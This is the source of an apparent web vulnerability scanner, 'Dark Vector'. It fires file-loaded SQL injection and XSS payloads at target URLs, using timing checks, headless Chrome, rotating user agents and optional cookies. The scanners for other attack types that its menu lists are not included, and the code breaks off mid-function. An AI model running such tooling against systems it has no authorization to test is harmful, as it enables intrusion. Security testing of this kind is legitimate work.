#!/usr/bin/python3

class Color:
    BLUE = '\033[94m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;208m'
    BOLD = '\033[1m'
    UNBOLD = '\033[22m'
    ITALIC = '\033[3m'
    UNITALIC = '\033[23m'

try:
    import os
    import sys
    import requests
    import yaml
    import shutil
    from flask import session
    from concurrent.futures import Executor
    import urllib
    import signal
    import sys
    import threading
    from urllib.parse import urlsplit
    import subprocess
    from urllib.parse import urlunsplit
    import asyncio
    from selenium.webdriver.chrome.service import Service
    import re
    from rich.progress import Progress
    import urllib.parse
    import requests
    import urllib3
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from prompt_toolkit import prompt
    from prompt_toolkit.completion import PathCompleter
    from urllib.parse import urlparse
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from curses import panel
    import random
    import re
    from wsgiref import headers
    from colorama import Fore, Style, init
    from time import sleep
    from rich import print as rich_print
    from rich.panel import Panel
    from rich.table import Table
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
    from bs4 import BeautifulSoup
    import urllib3
    from prompt_toolkit import prompt
    from prompt_toolkit.completion import PathCompleter
    import logging
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import argparse
    import concurrent.futures
    import time
    import aiohttp
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    from urllib.parse import urlsplit, parse_qs, urlencode, urlunsplit
    from rich.console import Console
    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
    from functools import partial
    from rich.text import Text
    from queue import Queue
    from threading import Lock

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.65 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; GT-I9505 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-P5113 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
        "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Firefox/11.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0",
        "Mozilla/5.0 (Windows NT 6.1; U;WOW64; de;rv:11.0) Gecko Firefox/11.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0",
        "Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
        "Mozilla/5.0 (X11; Mageia; Linux x86_64; rv:10.0.9) Gecko/20100101 Firefox/10.0.9",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0a2) Gecko/20111101 Firefox/9.0a2",
        "Mozilla/5.0 (Windows NT 6.2; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:8.0; en_us) Gecko/20100101 Firefox/8.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/7.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2",
        "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36",
        "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13"
    ]

    
    init(autoreset=True)
    
    def check_and_install_packages(packages):
        for package, version in packages.items():
            try:
                __import__(package)
            except ImportError:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_menu():
        title = r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
    """
        print(Color.CYAN + Style.BRIGHT + title.center(90))
        print(Fore.MAGENTA + Style.DIM + "vulnerability scanner".center(90))
        print(Fore.CYAN + Style.BRIGHT + "═" * 90)
        border_color = Color.CYAN + Style.BRIGHT
        option_color = Fore.WHITE + Style.BRIGHT  
        
        print(border_color + "╔" + "═" * 88 + "╗")
        
        options = [
            "  [1] LFi Scanner       │  [2] OR Scanner        │  [3] SQLi Scanner",
            "  [4] XSS Scanner       │  [5] CRLF Scanner      │  [6] Exit",
        ]
        
        for option in options:
            print(border_color + "║" + option_color + option.ljust(88) + border_color + "║")
        
        print(border_color + "╚" + "═" * 88 + "╝")
        instructions = "Select an option by entering the corresponding number:"
        
        print(Fore.CYAN + Style.BRIGHT + "═" * 90)
        print(Fore.YELLOW + Style.BRIGHT + instructions.center(90))
        print(Fore.CYAN + Style.BRIGHT + "═" * 90)
        print(Fore.MAGENTA + Style.DIM + "~ built by henok habatmu ~".center(90))
        print()

    def print_exit_menu():
        clear_screen()

        panel = Panel(r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     

                    ~ built by henok habatmu ~
            """,
            style="bold cyan",
            border_style="bright_magenta",
            expand=False
        )

        rich_print(panel)
        print(Color.RED + "\n\n  [ Session Terminated ]\n")
        sys.exit()

    def run_sql_scanner(scan_state=None):
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            init(autoreset=True)
            
            def get_random_user_agent():
                return random.choice(USER_AGENTS)
                
            def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
                    session = requests.Session()
                    retry = Retry(
                    total=retries,
                    read=retries,
                    connect=retries,
                    backoff_factor=backoff_factor,
                    status_forcelist=status_forcelist,
                    )
                    adapter = HTTPAdapter(max_retries=retry)
                    session.mount('http://', adapter)
                    session.mount('https://', adapter)
                    return session

            def perform_request(url, payload, cookie):
                url_with_payload = f"{url}{payload}"
                start_time = time.time()
                    
                headers = {
                    'User-Agent': get_random_user_agent()
                }

                try:
                    response = requests.get(url_with_payload, headers=headers, cookies={'cookie': cookie} if cookie else None)
                    response.raise_for_status()
                    success = True
                    error_message = None
                except requests.exceptions.RequestException as e:
                    success = False
                    error_message = str(e)

                response_time = time.time() - start_time
                
                vulnerability_detected = response_time >= 10
                if vulnerability_detected and scan_state:
                    scan_state['vulnerability_found'] = True
                    scan_state['vulnerable_urls'].append(url_with_payload)
                    scan_state['total_found'] += 1
                if scan_state:
                    scan_state['total_scanned'] += 1
                
                return success, url_with_payload, response_time, error_message, vulnerability_detected

            def get_file_path(prompt_text):
                completer = PathCompleter()
                return prompt(prompt_text, completer=completer).strip()

            def handle_exception(exc_type, exc_value, exc_traceback, vulnerable_urls, total_found, total_scanned, start_time):
                if issubclass(exc_type, KeyboardInterrupt):
                    print(f"\n{Fore.YELLOW}Program terminated by the user!")
                    save_results(vulnerable_urls, total_found, total_scanned, start_time)
                    sys.exit(0)
                else:
                    print(f"\n{Fore.RED}An unexpected error occurred: {exc_value}")
                    sys.exit(0)

            def save_results(vulnerable_urls, total_found, total_scanned, start_time):
                pass
                    
            def prompt_for_urls():
                while True:
                    try:
                        url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                        if url_input:
                            if not os.path.isfile(url_input):
                                raise FileNotFoundError(f"File not found: {url_input}")
                            with open(url_input) as file:
                                urls = [line.strip() for line in file if line.strip()]
                            return urls
                        else:
                            single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
                            if single_url:
                                return [single_url]
                            else:
                                print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                                input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                                clear_screen()
                                print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector!\n")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                        input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                        clear_screen()
                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector!\n")

            def prompt_for_payloads():
                while True:
                    try:
                        payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                        if not os.path.isfile(payload_input):
                            raise FileNotFoundError(f"File not found: {payload_input}")
                        with open(payload_input, 'r', encoding='utf-8') as f:
                            payloads = [line.strip() for line in f if line.strip()]
                        return payloads
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                        input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                        clear_screen()
                        print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector!\n")

            def print_scan_summary(total_found, total_scanned, start_time):
                summary = [
                    "→ Scanning finished.",
                    f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                    f"• Total scanned: {total_scanned}",
                    f"• Time taken: {int(time.time() - start_time)} seconds"
                ]
                max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
                border = "┌" + "─" * (max_length + 2) + "┐"
                bottom_border = "└" + "─" * (max_length + 2) + "┘"
                
                print(Fore.YELLOW + f"\n{border}")
                for line in summary:
                    padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                    padding = max_length - len(padded_line)
                    print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
                print(Fore.YELLOW + bottom_border)

            def main():
                clear_screen()

                panel = Panel(r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
         ── SQL Injection Scanner ──
""",
                style="bold green",
                border_style="cyan",
                expand=False
                )
                rich_print(panel, "\n")

                print(Fore.GREEN + "Welcome to the SQL Testing Tool!\n")

                urls = prompt_for_urls()
                payloads = prompt_for_payloads()
                
                cookie = input("[?] Enter the cookie to include in the GET request (press Enter if none): ").strip() or None

                threads = int(input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip() or 5)
                print(f"\n{Fore.YELLOW}[i] Loading, Please Wait...")
                clear_screen()
                print(f"{Fore.CYAN}[i] Starting scan...\n")
                vulnerable_urls = []
                first_vulnerability_prompt = True

                single_url_scan = len(urls) == 1
                start_time = time.time()
                total_scanned = 0
                total_found = 0
                    
                get_random_user_agent()
                try:
                    if threads == 0:
                        for url in urls:
                            box_content = f" → Scanning URL: {url} "
                            box_width = max(len(box_content) + 2, 40)
                            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                            for payload in payloads:
                                success, url_with_payload, response_time, error_message, vulnerability_detected = perform_request(url, payload, cookie)

                                if vulnerability_detected:
                                    stripped_payload = url_with_payload.replace(url, '')
                                    encoded_stripped_payload = quote(stripped_payload, safe='')
                                    encoded_url = f"{url}{encoded_stripped_payload}"
                                    if single_url_scan:
                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                        encoded_url_with_payload = encoded_url
                                    else:
                                        list_stripped_payload = url_with_payload
                                        for u in urls:
                                            list_stripped_payload = list_stripped_payload.replace(u, '')
                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                    print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                    vulnerable_urls.append(url_with_payload)
                                    total_found += 1
                                    
                                else:
                                    stripped_payload = url_with_payload.replace(url, '')
                                    encoded_stripped_payload = quote(stripped_payload, safe='')
                                    encoded_url = f"{url}{encoded_stripped_payload}"
                                    if single_url_scan:
                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                        encoded_url_with_payload = encoded_url
                                    else:
                                        list_stripped_payload = url_with_payload
                                        for u in urls:
                                            list_stripped_payload = list_stripped_payload.replace(u, '')
                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                    print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                total_scanned += 1
                                
                    else:
                        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                            for url in urls:
                                box_content = f" → Scanning URL: {url} "
                                box_width = max(len(box_content) + 2, 40)
                                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                                
                                futures = []
                                for payload in payloads:
                                    futures.append(executor.submit(perform_request, url, payload, cookie))

                                for future in concurrent.futures.as_completed(futures):
                                    success, url_with_payload, response_time, error_message, vulnerability_detected = future.result()

                                    if vulnerability_detected:
                                        stripped_payload = url_with_payload.replace(url, '')
                                        encoded_stripped_payload = quote(stripped_payload, safe='')
                                        encoded_url = f"{url}{encoded_stripped_payload}"
                                        if single_url_scan:
                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                            encoded_url_with_payload = encoded_url
                                        else:
                                            list_stripped_payload = url_with_payload
                                            for u in urls:
                                                list_stripped_payload = list_stripped_payload.replace(u, '')
                                            encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                            encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                        print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                        vulnerable_urls.append(url_with_payload)
                                        total_found += 1
                                        if single_url_scan and first_vulnerability_prompt:
                                            continue_scan = input(f"{Fore.CYAN}\n[?] Vulnerability found. Do you want to continue testing other payloads? (y/n, press Enter for n): ").strip().lower()
                                            if continue_scan != 'y':
                                                break
                                            first_vulnerability_prompt = False

                                    else:
                                        stripped_payload = url_with_payload.replace(url, '')
                                        encoded_stripped_payload = quote(stripped_payload, safe='')
                                        encoded_url = f"{url}{encoded_stripped_payload}"
                                        if single_url_scan:
                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                            encoded_url_with_payload = encoded_url
                                        else:
                                            list_stripped_payload = url_with_payload
                                            for u in urls:
                                                list_stripped_payload = list_stripped_payload.replace(u, '')
                                            encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                            encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                            print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                        print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                    total_scanned += 1

                    print_scan_summary(total_found, total_scanned, start_time)
                    save_results(vulnerable_urls, total_found, total_scanned, start_time)
                except Exception as e:
                    print(f"{Fore.RED}An error occurred: {str(e)}")
                finally:
                    if 'executor' in locals():
                        executor.shutdown(wait=False)
                    sys.exit(0)

            if __name__ == "__main__":
                try:
                    main()
                except KeyboardInterrupt:
                    sys.exit(0)


    def run_xss_scanner(scan_state=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        logging.getLogger('WDM').setLevel(logging.ERROR)
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        console = Console()

        driver_pool = Queue()
        driver_lock = Lock()

        def load_payloads(payload_file):
            try:
                with open(payload_file, "r") as file:
                    return [line.strip() for line in file if line.strip()]
            except Exception as e:
                print(Fore.RED + f"[!] Error loading payloads: {e}")
                exit()

        def generate_payload_urls(url, payload):
            url_combinations = []
            scheme, netloc, path, query_string, fragment = urlsplit(url)
            if not scheme:
                scheme = 'http'
            
            query_params = parse_qs(query_string, keep_blank_values=True)
            for key in query_params.keys():
                modified_params = query_params.copy()
                modified_params[key] = [payload]
                modified_query_string = urlencode(modified_params, doseq=True)
                modified_url = urlunsplit((scheme, netloc, path, modified_query_string, fragment))
                url_combinations.append(modified_url)
            
            if fragment:
                if '=' in fragment:
                    fragment_params = parse_qs(fragment, keep_blank_values=True)
                    for key in fragment_params.keys():
                        modified_fragment_params = fragment_params.copy()
                        modified_fragment_params[key] = [payload]
                        modified_fragment_string = urlencode(modified_fragment_params, doseq=True)
                        modified_url = urlunsplit((scheme, netloc, path, query_string, modified_fragment_string))
                        url_combinations.append(modified_url)
                else:
                    modified_url = urlunsplit((scheme, netloc, path, query_string, payload))
                    url_combinations.append(modified_url)
            
            if not query_params and not fragment:
                new_query = urlencode({'test': payload})
                modified_url = urlunsplit((scheme, netloc, path, new_query, fragment))
                url_combinations.append(modified_url)
                
                modified_url_fragment = urlunsplit((scheme, netloc, path, query_string, payload))
                url_combinations.append(modified_url_fragment)
            
            return url_combinations

        def create_driver():
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-browser-side-navigation")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.page_load_strategy = 'eager'
            logging.disable(logging.CRITICAL)
            

            driver_service = Service(ChromeDriverManager().install())
            return webdriver.Chrome(service=driver_service, options=chrome_options)

        def get_driver():
            try:
                return driver_pool.get_nowait()
            except:
                with driver_lock:
                    return create_driver()

        def return_driver(driver):
            driver_pool.put(driver)

        def check_vulnerability(url, payload, vulnerable_urls, total_scanned, timeout, scan_state):
            driver = get_driver()
            try:
                payload_urls = generate_payload_urls(url, payload)
                if not payload_urls:
                    return

                for payload_url in payload_urls:
                    try:
                        driver.get(payload_url)
                        
                        total_scanned[0] += 1
                        
                        try:
                            alert = WebDriverWait(driver, timeout).until(EC.alert_is_present())
                            alert_text = alert.text

                            if alert_text:
                                result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable:{Fore.GREEN} {payload_url} {Fore.CYAN} - Alert Text: {alert_text}"
                                print(result)
                                vulnerable_urls.append(payload_url)
                                if scan_state:
                                    scan_state['vulnerability_found'] = True
                                    scan_state['vulnerable_urls'].append(payload_url)
                                    scan_state['total_found'] += 1
                                alert.accept()
                            else:
                                result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}"
                                print(result)

                        except TimeoutException:
                            print(Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}")

                    except UnexpectedAlertPresentException:
                        pass
            finally:
                return_driver(driver)



        def run_scan(urls, payload_file, timeout, scan_state):
            payloads = load_payloads(payload_file)
            vulnerable_urls = []
            total_scanned = [0]
            
            for _ in range(3):
                driver_pool.put(create_driver())
            
            try:
                with ThreadPoolExecutor(max_workers=2) as executor:
                    futures = []
                    for url in urls:
                        for payload in payloads:
                            futures.append(
                                executor.submit(
                                    check_vulnerability,
                                    url,
                                    payload,
                                    vulnerable_urls,
                                    total_scanned,
                                    timeout,
                                    scan_state
                                )
                            )
                    
                    for future in as_completed(futures):
                        try:
                            future.result(timeout)
                        except Exception as e:
                            print(Fore.RED + f"[!] Error during scan: {e}")
                            
            finally:
                while not driver_pool.empty():
                    driver = driver_pool.get()
                    driver.quit()
                    
                return vulnerable_urls, total_scanned[0]

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            for line in summary:
                print(Fore.YELLOW + line)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            pass

        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing URLs (or press Enter to enter a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
                            clear_screen()
                            print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading the input file. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")


        def prompt_for_valid_file_path(prompt_text):
            while True:
                file_path = get_file_path(prompt_text).strip()
                if not file_path:
                    print(Fore.RED + "[!] You must provide a file containing the payloads.")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
                    continue
                if os.path.isfile(file_path):
                    return file_path
                else:
                    print(Fore.RED + "[!] Error reading the input file.")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")

        def main():
            clear_screen()
            panel = Panel(r"""
    ____             __      _    __          __            
   / __ \____ ______/ /__   | |  / /__  _____/ /_____  _____
  / / / / __ `/ ___/ //_/   | | / / _ \/ ___/ __/ __ \/ ___/
 / /_/ / /_/ / /  / ,<      | |/ /  __/ /__/ /_/ /_/ / /    
/_____/\__,_/_/  /_/|_|     |___/\___/\___/\__/\____/_/     
         ── XSS Scanner ──
                """,
                        style="bold green",
                        border_style="cyan",
                        expand=False
                    )

            console.print(panel, "\n")
            print(Fore.GREEN + "Welcome to the XSS Testing Tool!\n")
            urls = prompt_for_urls()

            payload_file = prompt_for_valid_file_path("[?] Enter the path to the payloads file: ")
            
            try:
                timeout = float(input(Fore.CYAN + "Enter the timeout duration for each request (Press Enter for 0.5): "))
            except ValueError:
                timeout = 0.5

            clear_screen()
            print(f"{Fore.CYAN}[i] Starting scan...\n")

            scan_state = {'vulnerability_found': False, 'total_found': 0, 'vulnerable_urls': []}
            all_vulnerable_urls = []
            total_scanned = 0
            start_time = time.time()

            try:
                for url in urls:
                    box_content = f" → Scanning URL: {url} "
                    box_width = max(len(box_content) + 2, 40)
                    print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                    print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                    print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")

                    vulnerable_urls, scanned = run_scan([url], payload_file, timeout, scan_state)
                    all_vulnerable_urls.extend(vulnerable_urls)
                    total_scanned += scanned

            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] Scan interrupted by the user.")
                print_scan_summary(scan_state['total_found'], total_scanned, start_time)
